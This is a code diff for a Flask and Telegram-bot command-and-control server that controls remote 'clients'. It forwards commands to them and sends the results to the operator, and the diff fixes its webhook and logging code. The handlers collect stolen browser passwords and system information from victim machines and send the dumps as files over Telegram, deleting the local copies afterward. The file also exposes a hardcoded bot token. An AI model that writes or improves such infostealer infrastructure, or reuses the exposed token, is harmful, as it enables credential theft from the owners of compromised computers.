@@ -21,7 +21,7 @@ app = Flask(__name__)
 # ===== КОНФИГУРАЦИЯ =====
 BOT_TOKEN = "8004274832:AAG2gDVDp_dQLllcVBIYVB-0WTJ1Ts4CtCU"
 AUTHORIZED_USERS = [6330090175]
-SERVER_URL = "https://mypc-wk16.onrender.com"  # Убедитесь что URL правильный!
+SERVER_URL = "https://mypc-wk16.onrender.com"
 PORT = 10000
 # ========================
 
@@ -48,7 +48,7 @@ def cleanup_clients():
         
         for client_id in inactive:
             del CLIENTS[client_id]
-            logging.info(f"Removed inactive client: {client_id}")
+            logger.info(f"Removed inactive client: {client_id}")
 
 # Регистрация клиента
 @app.route('/register', methods=['POST'])
@@ -85,7 +85,7 @@ def register_client():
                 }
             )
         except Exception as e:
-            logging.error(f"Notification error: {e}")
+            logger.error(f"Notification error: {e}")
     
     return jsonify({"status": "success"})
 
@@ -112,7 +112,7 @@ def client_command(client_id, command):
         
         return response.content, response.status_code, response.headers.items()
     except Exception as e:
-        logging.error(f"Forward error: {e}")
+        logger.error(f"Forward error: {e}")
         return jsonify({"error": str(e)}), 500
 
 # Telegram Bot Handlers
@@ -220,15 +220,17 @@ async def handle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         report += f"\n*{browser}*: {len(browser_data['passwords'])} паролей"
                 
                 # Отправляем полные данные файлом
-                with open(f"browser_data_{client_id}.json", "w") as f:
+                filename = f"browser_data_{client_id}.json"
+                with open(filename, "w", encoding="utf-8") as f:
                     json.dump(data, f)
                 
-                await query.edit_message_text(report)
+                await query.edit_message_text(report, parse_mode="Markdown")
                 await context.bot.send_document(
                     chat_id=query.message.chat_id,
-                    document=open(f"browser_data_{client_id}.json", "rb"),
-                    filename=f"browser_data_{client_id}.json"
+                    document=open(filename, "rb"),
+                    filename=filename
                 )
+                os.remove(filename)
             elif command == "system_info":
                 data = response.json()
                 # Формируем краткий отчет
@@ -241,21 +243,23 @@ async def handle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
                 
                 # Отправляем полные данные файлом
-                with open(f"system_info_{client_id}.json", "w") as f:
+                filename = f"system_info_{client_id}.json"
+                with open(filename, "w", encoding="utf-8") as f:
                     json.dump(data, f)
                 
-                await query.edit_message_text(report)
+                await query.edit_message_text(report, parse_mode="Markdown")
                 await context.bot.send_document(
                     chat_id=query.message.chat_id,
-                    document=open(f"system_info_{client_id}.json", "rb"),
-                    filename=f"system_info_{client_id}.json"
+                    document=open(filename, "rb"),
+                    filename=filename
                 )
+                os.remove(filename)
             else:
                 await query.edit_message_text(f"✅ Команда выполнена на {CLIENTS[client_id]['name']}")
         else:
             await query.edit_message_text(f"❌ Ошибка выполнения команды")
     except Exception as e:
-        logging.error(f"Command error: {e}")
+        logger.error(f"Command error: {e}")
         await query.edit_message_text("🔥 Ошибка соединения с устройством")
 
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -307,7 +311,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text("❌ Ошибка получения списка файлов")
     
     except Exception as e:
-        logging.error(f"Text command error: {e}")
+        logger.error(f"Text command error: {e}")
         await update.message.reply_text("🔥 Ошибка соединения с устройством")
     
     # Сбрасываем состояние
@@ -320,29 +324,32 @@ def register_handlers():
     bot_app.add_handler(CallbackQueryHandler(handle_command))
     bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
 
-# Веб-хук обработчик
+# Веб-хук обработчик (исправленная версия)
 @app.post(f'/{BOT_TOKEN}')
 def webhook():
     json_data = request.get_json()
     update = Update.de_json(json_data, bot_app.bot)
     logger.info(f"Received update: {update.update_id}")
-    bot_app.update_queue.put(update)
+    
+    # Используем потокобезопасный метод для добавления обновления
+    try:
+        bot_app.update_queue.put_nowait(update)
+    except Exception as e:
+        logger.error(f"Error putting update in queue: {e}")
+    
     return '', 200
 
 # Установка веб-хука при запуске
 async def set_webhook():
     webhook_url = f"{SERVER_URL}/{BOT_TOKEN}"
     try:
-        await bot_app.bot.set_webhook(webhook_url)
-        logger.info(f"Webhook установлен: {webhook_url}")
+        result = await bot_app.bot.set_webhook(webhook_url)
+        logger.info(f"Webhook установлен: {webhook_url} - {result}")
     except Exception as e:
         logger.error(f"Ошибка установки webhook: {e}")
 
 def run_bot():
     register_handlers()
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(set_webhook())
     
     # Запуск бота в фоновом потоке с обработкой обновлений
     def start_bot():
@@ -350,14 +357,20 @@ def run_bot():
         asyncio.set_event_loop(loop)
         
         try:
-            # КРИТИЧЕСКИ ВАЖНО: запускаем процессор обновлений
+            # Инициализация бота
             loop.run_until_complete(bot_app.initialize())
-            loop.run_until_complete(bot_app.start())
+            
+            # Установка вебхука
+            loop.run_until_complete(set_webhook())
+            
+            # Запуск обработки обновлений
             logger.info("Бот запущен и готов к обработке обновлений")
-            loop.run_forever()  # Бесконечный цикл для обработки обновлений
+            loop.run_until_complete(bot_app.start())
+            loop.run_forever()
         except Exception as e:
             logger.exception(f"Fatal error in bot thread: {e}")
         finally:
+            loop.run_until_complete(bot_app.stop())
             loop.close()
     
     bot_thread = threading.Thread(target=start_bot, daemon=True)
@@ -378,4 +391,4 @@ if __name__ == "__main__":
     run_bot()
     
     # Запуск Flask сервера
-    app.run(host='0.0.0.0', port=PORT, debug=False)  # Отключите debug в продакшене
+    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
